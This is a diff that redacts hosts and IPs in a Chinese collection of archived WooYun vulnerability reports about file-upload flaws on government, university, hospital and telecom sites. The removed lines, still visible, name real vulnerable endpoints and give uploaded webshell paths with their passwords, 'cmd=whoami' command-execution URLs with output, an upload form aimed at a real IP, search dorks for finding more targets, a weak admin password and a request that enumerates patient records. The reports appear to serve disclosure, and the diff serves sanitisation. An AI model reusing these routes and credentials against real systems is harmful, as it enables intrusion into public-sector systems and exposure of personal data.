-**POC**: 任意文件上传http://222.83.251.40/fckeditor/editor/filemanager/browser/default/browser.html?Connector=http://222.83.251.40/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector可以直接上传jsp文件一句话地址：http://222.83.251.40/fckeditorhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/Image/test.jsp
+**POC**: 任意文件上传http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -17032,7 +17032,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: #1.这套系统主要是用在政务服务中心、行政服务中心之类的，是一套JSP的CMS，并且百度谷歌等搜索引擎均可以用关键字搜索到存在该类系统的网站，全部都为政府级别的网站，该系统中的后台上传页面未经过任何权限验证，导致可以访问上传页面，并且可上传任意格式的文件。我们来谷歌一下关键字，你就会发现全是政务服务中心的标题：<img src="https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/201403/161256078a78013af2ab82a25c49f39d8d27a2ef.jpg"利用页面：admin/upload.jsp 主要是这个上传页面getFileList.action 管理文件页面admin/getFileList.action 管理文件页面mutual/getFileList.action 管理文件页面#2.以下是收集了
+**详情**: #1.这套系统主要是用在政务服务中心、行政服务中心之类的，是一套JSP的CMS，并且某搜索引擎谷歌等搜索引擎均可以用关键字搜索到存在该类系统的网站，全部都为政府级别的网站，该系统中的后台上传页面未经过任何权限验证，导致可以访问上传页面，并且可上传任意格式的文件。我们来谷歌一下关键字，你就会发现全是政务服务中心的标题：<img src="https://example.com/[已脱敏]"利用页面：admin/upload.jsp 主要是这个上传页面getFileList.action 管理文件页面admin/getFileList.action 管理文件页面mutual/getFileList.action 管理文件页面#2.以下是收集了
 
 **POC**: #3.我们看看它的上传页面全部都是一样，可推断是同款系统。#4.以第一个作为例子来证明可任意上传文件，上传一个JSP大马，上传完毕后跳转到文件管理，复制下载地址，默认是在http://www.***.com/upimg/info/***.jsp 这里。上传文件并没有被改名，看了不少这样的政府网，估计都被入侵了不少~权限还蛮大~
 
@@ -17076,9 +17076,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 直接上漏洞证明吧，这个漏洞没有什么好解释的。也就是我们常说的解析漏洞。http://exam.gmw.cn/xieliu/images/banner/Accountant/1.jpg（如图）漏洞证明：http://exam.gmw.cn/xieliu/images/banner/Accountant/1.jpg/1.php （如图）
+**详情**: 直接上漏洞证明吧，这个漏洞没有什么好解释的。也就是我们常说的解析漏洞。https://example.com/[已脱敏] （如图）
 
-**POC**: 直接上漏洞证明吧，这个漏洞没有什么好解释的。也就是我们常说的解析漏洞。http://exam.gmw.cn/xieliu/images/banner/Accountant/1.jpg（如图）漏洞证明：http://exam.gmw.cn/xieliu/images/banner/Accountant/1.jpg/1.php （如图）
+**POC**: 直接上漏洞证明吧，这个漏洞没有什么好解释的。也就是我们常说的解析漏洞。https://example.com/[已脱敏] （如图）
 
 **绕过**: 直接利用
 
@@ -17120,9 +17120,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://hunangrain.gov.cn/shenpi/main/upload.jsphttp://hunangrain.gov.cn/shenpihttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/20150602_065848.jsp?pwd=023&i=whoamiwin-h0jnjdbpdt0\administratorn-h0jnjdbpdt0\administratorhttp://www.1890.gov.cn/upload.jsphttp://www.1890.gov.cnhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/1433198443992@1433198443992.jsp?pwd=023&i=whoamint authority\system
+**详情**: https://example.com/[已脱敏] authority\system
 
-**POC**: http://hunangrain.gov.cn/shenpi/main/upload.jsphttp://hunangrain.gov.cn/shenpihttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/20150602_065848.jsp?pwd=023&i=whoamiwin-h0jnjdbpdt0\administratorn-h0jnjdbpdt0\administratorhttp://www.1890.gov.cn/upload.jsphttp://www.1890.gov.cnhttps://wooyun-img.os
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -17164,9 +17164,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.nanzheng.gov.cn/texteditor/include/upload.aspx这个就是漏洞文件了先是直接上传试了一下返回信息里可以明白一切了，另外这绝对是人为恶意添加的，默认不可能有这几个后缀。然后构造URL上传http://www.nanzheng.gov.cn/texteditor/include/upload.aspx?type=File证实FILE确实可以上传此类后缀，不过应该是某位黑产牛为了防止同行二次破坏，就给设置了写入权限。
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://www.nanzheng.gov.cn/log.txt另外还把日志文件暴露了，里面可以看到各种后台路径已经网站存放路径。http://www.nanzheng.gov.cn/htdlmin/Login.aspx日志上写的是2012年的 如果真是那么久的 那么久删掉吧。
+**POC**: https://example.com/[已脱敏] 如果真是那么久的 那么久删掉吧。
 
 **绕过**: 直接利用
 
@@ -17175,7 +17175,7 @@
 
 ---
 ### [wooyun-2015-0114092] 翼机通省平台存在任意文件上传漏洞
-**厂商**: 中国电信 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行
+**厂商**: 某运营商 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 认证接口
 
@@ -17186,9 +17186,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 系统的全名我是从用户手册中发现的http://14.146.224.121/systemmgr/syshelp!loadHelpFile.jspx?filename=user_manual.rar系统首页显示的是“一卡通平台”系统地址：http://14.146.224.121/login.jspx我注册了一个帐号：很好的公司密码：很好的公司请原谅我用这么土的名字很好的公司/很好的公司,进行登录
+**详情**: 系统的全名我是从用户手册中发现的http://[IP已脱敏]
 
-**POC**: 在数据管理，用户信息管理界面，你得新建一个用户信息可以随便填，新建成功后，我们发现头像那块多出来一个上传照片的链接上传后抓包改文件名后缀，即可上传jsp一句话一句话地址：http://14.146.224.121/temp/916820.jsp密码：woo0yun
+**POC**: 在数据管理，用户信息管理界面，你得新建一个用户信息可以随便填，新建成功后，我们发现头像那块多出来一个上传照片的链接上传后抓包改文件名后缀，即可上传jsp一句话一句话地址：http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -17208,9 +17208,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 网站群内容管理系统   inurl:adminindex.jsphttp://www.cre.cn/cms/site/cms_site_template_upload.jsphttp://www.cupl.edu.cn:81/cms/site/cms_site_template_upload.jsphttp://www.chinca.org/cms/cms/site/cms_site_template_upload.jsp……
+**详情**: 网站群内容管理系统   inurl:adminindex.jsphttps://example.com/[已脱敏]
 
-**POC**: http://www.cre.cn/site_template/上传文件地址……http://www.chinca.org/cms/site_template/1.jsp……
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -17230,7 +17230,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 网站地址：http://124.127.49.68:83/total.asp一看就有想法了，于是：http://124.127.49.68:83/excel/
+**详情**: 网站地址：http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -17252,9 +17252,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 存在fck漏洞http://gaztbw.gov.cn/fckeditor/editor/fckeditor.html直接上传asp木马
+**详情**: 存在fck漏洞https://example.com/[已脱敏]
 
-**POC**: http://gaztbw.gov.cn/project/image/File/xunyi/xy.asp密码xunyi
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -17274,9 +17274,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: filetype:do百度和google 搜索到的相关网站，同时吧gov 和edu IIS server 可写的低级漏洞也整理了以下！
+**详情**: filetype:do某搜索引擎和google 搜索到的相关网站，同时吧gov 和edu IIS server 可写的低级漏洞也整理了以下！
 
-**POC**: http://www.news.muc.edu.cn	IIS Put File Allow http://www.news.muc.edu.cn/f2b3be.asp;.jpghttp://lib.gxqzu.edu.cn		IIS Put File Allow http://lib.gxqzu.edu.cn/7d686e.asp;.jpghttp://jgbz.shaoxing.gov.cn	IIS Put File Allow http://jgbz.shaoxing.gov.cn/5ef72e.asp;.jpghttp://ipe.gzu.edu.cn		IIS Put File All
+**POC**: https://example.com/[已脱敏]	IIS Put File Allow https://example.com/[已脱敏]		IIS Put File Allow https://example.com/[已脱敏]	IIS Put File Allow https://example.com/[已脱敏]		IIS Put File All
 
 **绕过**: 直接利用
 
@@ -17296,7 +17296,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 后台一处上传功能没有任何访问限制，也没有任何上传类型限制http://www.itsmoe.com/Admin/File.aspx因为东大智能企业的特殊性质，服务器上有众多的网站源码、交通智能化基建设施代码、公司报表等等数据信息大致看了下服务器，已经成了养鸡场，各种马和提权工具，几乎都来自于这个疏忽了的上传漏洞
+**详情**: 后台一处上传功能没有任何访问限制，也没有任何上传类型限制https://example.com/[已脱敏]
 
 **POC**: 及时修复吧，一个小小的上传可能已经泄漏了众多网站、设施的源码，造成更大的危害
 
@@ -17340,7 +17340,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 这算是成功入侵事件吧，拿下了北航两台服务器，按照名单上说，还有上海大学计算中心等28所高校在用这个系统，名单：http://www.course.sei.buaa.edu.cn/Users/。另外北航使用的都是1.1.3版本，似乎1.1.6版本这个bug已经修复了，谁知道呢，没人用1.1.6。下面详细讲说一下入侵过程：北航使用这个平台的服务器有两台，一个是http://judge.sei.buaa.edu.cn/，另一个是http://crs.sei.buaa.edu.cn/，测试请到http://crs.sei.buaa.edu.cn/，学号stu，密码stu（这个账号和密码是在http://www.course.sei.buaa.edu.cn/demo/上对外公开的）。废话不多说，漏洞很简单0x00截断上传，古老的漏洞。进入学生页面之后，我们找到在线答疑，随便点开一个论坛，之后发新帖，
+**详情**: 这算是成功入侵事件吧，拿下了北航两台服务器，按照名单上说，还有上海大学计算中心等28所高校在用这个系统，名单：https://example.com/[已脱敏]
 
 **POC**: 数据库user.MYDwebshell
 
@@ -17406,9 +17406,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 某三级甲等医院遍历目录和fck上传漏洞遍历目录存在第二根目录，比如/fckeditor  ....等等fck上传地址：http://hospital.glmc.edu.cn/fckeditor//editor/filemanager/connectors/test.html
+**详情**: 某三级甲等医院遍历目录和fck上传漏洞遍历目录存在第二根目录，比如/fckeditor  ....等等fck上传地址：https://example.com/[已脱敏]
 
-**POC**: 某三级甲等医院遍历目录和fck上传漏洞遍历目录存在第二根目录，比如/fckeditor  ....等等fck上传地址：http://hospital.glmc.edu.cn/fckeditor//editor/filemanager/connectors/test.html
+**POC**: 某三级甲等医院遍历目录和fck上传漏洞遍历目录存在第二根目录，比如/fckeditor  ....等等fck上传地址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -17460,8 +17460,8 @@
 ---
 
 ---
-### [wooyun-2013-039563] 中国电信某后台文件上传导致代码执行
-**厂商**: 中国电信 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行
+### [wooyun-2013-039563] 某运营商某后台文件上传导致代码执行
+**厂商**: 某运营商 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 上传功能
 
@@ -17472,9 +17472,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞站点http://219.153.32.161/漏洞详情及利用方法http://hi.baidu.com/huting/item/ea77c29727803f9e58146199上传小马http://219.153.32.161/a/pwn.jsp?cmd=whoamihttp://219.153.32.161/a/pwn.jsp?cmd=ipconfighttp://219.153.32.161/a/pwn.jsp?cmd=systeminfohttp://219.153.32.161/a/pwn.jsp?cmd=dir不想截图了。
+**详情**: 漏洞站点http://[IP已脱敏]
 
-**POC**: http://219.153.32.161/a/pwn.jsp?cmd=whoamihttp://219.153.32.161/a/pwn.jsp?cmd=ipconfighttp://219.153.32.161/a/pwn.jsp?cmd=systeminfohttp://219.153.32.161/a/pwn.jsp?cmd=dir可以修改里面的war文件，直接上传大马。
+**POC**: http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -17494,9 +17494,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 用友GRP-U8 财务管理软件该servlet存在漏洞，可通过GET参数fileName控制上传的文件名/servlet/FileUpload随便构造一个表单，上传任意文件即可<html><form method="post" action="http://210.44.112.101/servlet/FileUpload?fileName=t.jsp&actionID=update" encType="multipart/form-data"><input type="file" name="rfile_name"/><input type="submit" value="upload"/></form></html>上传后的最终路径为：/R9iPortalhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/+fileName参数的
+**详情**: 用友GRP-U8 财务管理软件该servlet存在漏洞，可通过GET参数fileName控制上传的文件名/servlet/FileUpload随便构造一个表单，上传任意文件即可<html><form method="post" action="http://[IP已脱敏] encType="multipart/form-data"><input type="file" name="rfile_name"/><input type="submit" value="upload"/></form></html>上传后的最终路径为：/R9iPortalhttps://example.com/[已脱敏]
 
-**POC**: http://210.44.112.101/R9iPortalhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/t.jsp chopper
+**POC**: http://[IP已脱敏] chopper
 
 **绕过**: 直接利用
 
@@ -17516,7 +17516,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://qiche11a36.site3.sitestar.cn/qiche11a36/wwwroot/admin/FCKeditor/editor/fckeditor.html没设置权限
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 我就在虚礼机测试 SiteStar V2.2
 
@@ -17538,9 +17538,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 这个文件虽然多，但好像没有人提交这个目录下的啊？厂商：http://www.whir.net/index.html  北京万户网络技术有限公司上传点：/defaultroot/extension/smartUpload.jsp?path=information&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0Case:http://oa.tlchem.com.cn:7001/http://oa.elyl.com.cn:7001//http://61.132.136.122
+**详情**: 这个文件虽然多，但好像没有人提交这个目录下的啊？厂商：https://example.com/[已脱敏]  北京万户网络技术有限公司上传点：/defaultroot/extension/smartUpload.jsp?path=information&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0Case:https://example.com/[已脱敏]
 
-**POC**: 小小的测试一下：Shell in /defaultroothttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/information/****.jsp
+**POC**: 小小的测试一下：Shell in /defaultroothttps://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -17582,7 +17582,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: #1.今天是改善Gov安全的第五课！------该CMS主要是存在一个JSP的Fckeditor导致了任意文件上传，并且毫无限制地存在目录遍历，想看什么就看什么~关键字比较难构造，如下：inurl:u***es inurl:index.jspinurl:do***?siteid#2.根据该关键字可以发现，存在大量的这样的政府网站~其漏洞主要表现在Fckeditor的编辑上，地址如下：fckeditor/editor/filemanager/browser/default/browser.html?Type=../../..&Connector=connectors/jsp/connector以下枚举十例，【注意】仅提供给Cncert进行复现测试，其它人员请勿对提供的网站此进行利用或破坏，否则后果自负!：http://www.wuzhi.gov.cn/fckeditor/editor/fil
+**详情**: #1.今天是改善Gov安全的第五课！------该CMS主要是存在一个JSP的Fckeditor导致了任意文件上传，并且毫无限制地存在目录遍历，想看什么就看什么~关键字比较难构造，如下：inurl:u***es inurl:index.jspinurl:do***?siteid#2.根据该关键字可以发现，存在大量的这样的政府网站~其漏洞主要表现在Fckeditor的编辑上，地址如下：fckeditor/editor/filemanager/browser/default/browser.html?Type=../../..&Connector=connectors/jsp/connector以下枚举十例，【注意】仅提供给Cncert进行复现测试，其它人员请勿对提供的网站此进行利用或破坏，否则后果自负!：https://example.com/[已脱敏]
 
 **POC**: #3.以最后一例子来做测试，我们看看Fck编辑器带来的危害！可泄漏大量敏感信息！危害可想而知！看下面的图，完全可以遍历网站所有目录内容，包括一些敏感的文件信息！#4.测试是否能成功上传JSP脚本，成功上传zone.jsp
 
@@ -17604,9 +17604,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 案例如下：http://202.201.152.23:8080/idl30/admin/ftb.imagegallery.aspxhttp://qhbfm.jiehr.com.cn/admin/ftb.imagegallery.aspxhttp://211.86.245.155/admin/ftb.imagegallery.aspxhttp://lib.uir.cn:808/idl/admin/ftb.imagegallery.aspxhttp://61.167.120.67:8080/IDLWEB//admin/ftb.imagegallery.aspxhttp://xwlw.zju.edu.cn/idl/admin/ftb.imagegallery.aspxhttp://202.119.248.241/idl30//admin/ftb.imagegallery.aspxhttp://2
+**详情**: 案例如下：http://[IP已脱敏]
 
-**POC**: 1.测试案例：http://202.201.152.23:8080/idl30/admin/ftb.imagegallery.aspx
+**POC**: 1.测试案例：http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -17626,9 +17626,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 从上个漏洞得知有任意文件上传漏洞WooYun: 某省旅馆业治安管理信息系统任意文件上传漏洞（可能影响全省住店记录）应该还存在着别的上传页面，找了一会，找到了另一个上传的页面http://xxx/SysFun/UploadPic.htm存在该漏洞的网站：http://bc.jlslgy.com/http://sp.jlslgy.com/http://sy.jlslgy.com/http://th.jlslgy.com/http://yb.jlslgy.com/http://bs.jlslgy.com/http://cb.jlslgy.com/http://ly.jlslgy.com/
+**详情**: 从上个漏洞得知有任意文件上传漏洞WooYun: 某省旅馆业治安管理信息系统任意文件上传漏洞（可能影响全省住店记录）应该还存在着别的上传页面，找了一会，找到了另一个上传的页面http://xxx/SysFun/UploadPic.htm存在该漏洞的网站：https://example.com/[已脱敏]
 
-**POC**: 例子：任意文件上传页面http://bc.jlslgy.com/SysFun/UploadPic.htm直接上传一个txt文档，抓包进行修改。上传到的目录：/UploadFile/http://bc.jlslgy.com/UploadFile/1.aspx菜刀连接点到为止
+**POC**: 例子：任意文件上传页面https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -17692,7 +17692,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 存在问题站点：万达商业规划研究院地址：http://www.wdghy.com/webpage/column/regist1.shtml打开抓包软件，点上传。发现无任何网络数据，那说明是本地判断，那就好说了。代理，burp修改后缀，上传。貌似作品简介还没有任何过滤，直接可以传～大意啊大意～
+**详情**: 存在问题站点：万达商业规划研究院地址：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -17736,9 +17736,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 微博上传图片时只在前端进行验证, 服务器端没有进行安全过滤。\api\StatusesApi.class.phpfunction uploadpic(){if( $_FILES['pic'] ){//执行上传操作$savePath =  $this->_getSaveTempPath();$filename = md5( time().'teste' ).'.'.substr($_FILES['pic']['name'],strpos($_FILES['pic']['name'],'.')+1);if(@copy($_FILES['pic']['tmp_name'], $savePath.'/'.$filename) || @move_uploaded_file($_FILES['pic']['tmp_name'], $savePath.'/'.$filename)){$result['b
+**详情**: 某社交平台上传图片时只在前端进行验证, 服务器端没有进行安全过滤。\api\StatusesApi.class.phpfunction uploadpic(){if( $_FILES['pic'] ){//执行上传操作$savePath =  $this->_getSaveTempPath();$filename = md5( time().'teste' ).'.'.substr($_FILES['pic']['name'],strpos($_FILES['pic']['name'],'.')+1);if(@copy($_FILES['pic']['tmp_name'], $savePath.'/'.$filename) || @move_uploaded_file($_FILES['pic']['tmp_name'], $savePath.'/'.$filename)){$result['b
 
-**POC**: 在登录thinksns官方微博后,构建以下表单:<form action="http://t.thinksns.com/index.php?app=w3g&mod=Index&act=doPost" method="post" enctype="multipart/form-data" /><textarea name="content">test</textarea>file: <input id="file" type="file" name="pic" /><input type="submit" value="Post" /></form>去掉缩略图的前缀(small_ )
+**POC**: 在登录thinksns官方某社交平台后,构建以下表单:<form action="https://example.com/[已脱敏]" method="post" enctype="multipart/form-data" /><textarea name="content">test</textarea>file: <input id="file" type="file" name="pic" /><input type="submit" value="Post" /></form>去掉缩略图的前缀(small_ )
 
 **绕过**: 直接利用
 
@@ -17758,7 +17758,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: google hackingintext:技术支持:杭州孚立计算机软件有限公司附送几个案例**.**.**.**:8080/publichttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/file.jsphttp://**.**.**.**//publichttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/file.jsphttp://**.**.**.**/publichttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/file.jsphttp://**.**.**.**/publichttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/file.jsphttp://*
+**详情**: google hackingintext:技术支持:杭州孚立计算机软件有限公司附送几个案例**.**.**.**:8080/publichttps://example.com/[已脱敏]
 
 **POC**: 选一个漏洞证明上传时候不能直接上传jsp，但是用一个空格就直接绕过了，应该直接是黑名单检测吧返回包里也很友好的返回路径，么么哒大马地址 **.**.**.**/public/files/201510/5474453920151028082314.jsp密码：sec再传个菜刀马 http://**.**.**.**/public/files/201510/css1.jsp密码：cmd
 
@@ -17846,7 +17846,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 上传地址，http://2012.zhenai.com/ckfinder/ckfinder.html可惜不是iis啊！但是对本目录的文件，可以增删改减：
+**详情**: 上传地址，https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -17868,7 +17868,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 菊花：http://www.scfs.gov.cn/article/loadArticleHtml.action
+**详情**: 菊花：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -17912,7 +17912,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 临夏回族自治州人民检察院某上传漏洞。已成养马场！！上传点：http://www.lxzjc.gov.cn/jubao/admin/FCKeditor/editor/filemanager/connectors/test.html#
+**详情**: 临夏回族自治州人民检察院某上传漏洞。已成养马场！！上传点：https://example.com/[已脱敏]
 
 **POC**: 可getshell.
 
@@ -17934,9 +17934,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.先看后台弱口令http://admin.yihu.com/ 用户名admin 密码111111用户预约信息2.后台很多注入，随便找一个示例这里注入随便跑一下，后面有上传漏洞控制整个数据库3.看无边界医疗系统的越权，可遍历orgID查看所有预约的患者信息。POST /WbjUI/wbj2/business/yyqd_doAll.do HTTP/1.1Host: y.yihu.cnApi=ghzy.ArrangeInfoApi.queryDayPrintList&Param=%7B%22orgID%22%3A1023577%2C%22deptID%22%3A0%2C%22userSN%22%3A0%2C%22name%22%3A%22%22%2C%22cardID%22%3A%22%22%2C%22mobile%22%3A%22%22%2C%22currentPage%22%3A1%2C%
+**详情**: 1.先看后台弱口令https://example.com/[已脱敏] 用户名admin 密码111111用户预约信息2.后台很多注入，随便找一个示例这里注入随便跑一下，后面有上传漏洞控制整个数据库3.看无边界医疗系统的越权，可遍历orgID查看所有预约的患者信息。POST /WbjUI/wbj2/business/yyqd_doAll.do HTTP/1.1Host: y.yihu.cnApi=ghzy.ArrangeInfoApi.queryDayPrintList&Param=%7B%22orgID%22%3A1023577%2C%22deptID%22%3A0%2C%22userSN%22%3A0%2C%22name%22%3A%22%22%2C%22cardID%22%3A%22%22%2C%22mobile%22%3A%22%22%2C%22currentPage%22%3A1%2C%
 
-**POC**: 4.还是看另外一个站上传吧，来得快些。http://doctor.yihu.com/Myapps.aspx过滤了，没关系 ，上传图片抓包，在里面插入一句话成功上传。结果是各种 数据库。
+**POC**: 4.还是看另外一个站上传吧，来得快些。https://example.com/[已脱敏] ，上传图片抓包，在里面插入一句话成功上传。结果是各种 数据库。
 
 **绕过**: 直接利用
 
@@ -17978,7 +17978,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 看到这个WooYun: 美图秀秀分站任意上传我感觉还会有洞，几分钟的测试，果然还有，哈哈哈~~~成因应该和那个是一样的。http://kaka.meitu.com/20100214/step1.php# 这里
+**详情**: 看到这个WooYun: 美图秀秀分站任意上传我感觉还会有洞，几分钟的测试，果然还有，哈哈哈~~~成因应该和那个是一样的。https://example.com/[已脱敏] 这里
 
 **POC**: (见原文)
 
@@ -18002,7 +18002,7 @@
 
 **详情**: 中国新闻网某分站编辑器上传漏洞
 
-**POC**: 对中国新闻网某C段扫描发现这个网站http://stat.cns.com.cn/这是某业务统计系统，尝试很多弱口令都不对 ，，对网站进行扫描http://stat.cns.com.cn/js/fckeditor/editor/filemanager/connectors%2Fphp%2Fconnector.php?Command=GetFoldersAndFiles&Type=File&CurrentFolder=/发现有FCKediotr版本是2.6.4乌云上曾爆出这个版本的漏洞WooYun: fckeditor <= 2.6.4 任意文件上传漏洞使用漏洞EXPhttp://stat.cns
+**POC**: 对中国新闻网某C段扫描发现这个网站https://example.com/[已脱敏] ，，对网站进行扫描https://example.com/[已脱敏] fckeditor <= 2.6.4 任意文件上传漏洞使用漏洞EXPhttps://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -18022,7 +18022,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 编辑器地址:http://www.fjhospital.com/fckeditor/editor/filemanager/connectors/test.html
+**详情**: 编辑器地址:https://example.com/[已脱敏]
 
 **POC**: 漏洞证明
 
@@ -18068,7 +18068,7 @@
 
 **详情**: 广东联通客户俱乐部fck本地构造任意上传
 
-**POC**: http://club.gd.chinaunicom.com/UserFiles/File/c.jsp
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -18090,7 +18090,7 @@
 
 **详情**: ...........
 
-**POC**: 办公系统登陆页面  http://121.8.140.244:1000/admin/admin在红框处插入.aspx或.asp的后门点击红框处的下载即可访问http://121.8.140.244:1000/InfoSpeech/InfoSendFj/2014436541320545.aspx密码  admin连接特定的 DNS 后缀 . . . . . . . :本地链接 IPv6 地址. . . . . . . . : fe80::e1d5:8b50:b4df:be86%12IPv4 地址 . . . . . . . . . . . . : 192.168.10.5子网掩码  . . . 
+**POC**: 办公系统登陆页面  http://[IP已脱敏]  admin连接特定的 DNS 后缀 . . . . . . . :本地链接 IPv6 地址. . . . . . . . : fe80::e1d5:8b50:b4df:be86%12IPv4 地址 . . . . . . . . . . . . : [IP已脱敏]子网掩码  . . . 
 
 **绕过**: 直接利用
 
@@ -18154,7 +18154,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: imagegallery编辑器漏洞，虽然过滤了aspx马的直接上传，但是可以利用iis6的解析漏洞，上传图片马。202.195.195.210
+**详情**: imagegallery编辑器漏洞，虽然过滤了aspx马的直接上传，但是可以利用iis6的解析漏洞，上传图片马。[IP已脱敏]
 
 **POC**: 直接传入大马，成功拿到权限。就不提权了哈~
 
@@ -18176,9 +18176,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 关键字：inurl:info_details.jsp?seq上传点：http://www.website.com/editortpxx/upload.jsp例子：http://www.cnu.edu.cn/editortpxx/upload.jsp  首都师范大学http://crjy.cnu.edu.cn/zjxy/editortpxx/upload.jsp 首都师范大学继续教育学院http://www.biem.edu.cn/editortpxx/upload.jsp 北京经济管理职业学院http://sw.nedu.edu.cn/editortpxx/upload.jsp 东北电力大学http://www.usrn.edu.cn/editortpxx/upload.jsp 首都高校科研网
+**详情**: 关键字：inurl:info_details.jsp?seq上传点：https://example.com/[已脱敏]  首都师范大学https://example.com/[已脱敏] 首都师范大学继续教育学院https://example.com/[已脱敏] 北京经济管理职业学院https://example.com/[已脱敏] 东北电力大学https://example.com/[已脱敏] 首都高校科研网
 
-**POC**: 案例：http://crjy.cnu.edu.cn/zjxy/editortpxx/upload.jsp查看源码得到地址http://crjy.cnu.edu.cn/zjxy/UploadFile/8/4/50ea9b798e03103be441f757595f4c48.jsp
+**POC**: 案例：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -18242,9 +18242,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 系统地址：http://122.228.236.107:8080/瑞安市民政局殡葬管理系统问题出在fck编辑器fck地址：http://122.228.236.107:8080/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../http://122.228.236.107:8080/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://122.228.236.107:8080/editor/filemanager/browser/default/connectors/jsp/connector
+**详情**: 系统地址：http://[IP已脱敏]
 
-**POC**: 可跨目录任意文件上传,可直接上传jsp文件上传地址：UserFiles/Image/一句话地址：http://122.228.236.107:8080/UserFiles/Image/01.jsp密码：sq0zr
+**POC**: 可跨目录任意文件上传,可直接上传jsp文件上传地址：UserFiles/Image/一句话地址：http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -18264,7 +18264,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先是一处下载文件链接，没有检查文件路径，可下载系统上的任意文件：http://www.12320.gov.cn/manage/download.jsp?filepath=manage/login.jsp通过此方法，将整个后台的源代码下载下来，经检查，发现这个页面可上传文件，而且没有验证权限，令人震惊的是，只在客户端检查文件的类型，直接改下表单就可把jsp文件上传上去了：http://www.12320.gov.cn/manage/fujian.jsp更令人震惊的是，所有用户的密码竟然是明文保存的！！！
+**详情**: 首先是一处下载文件链接，没有检查文件路径，可下载系统上的任意文件：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -18286,9 +18286,9 @@
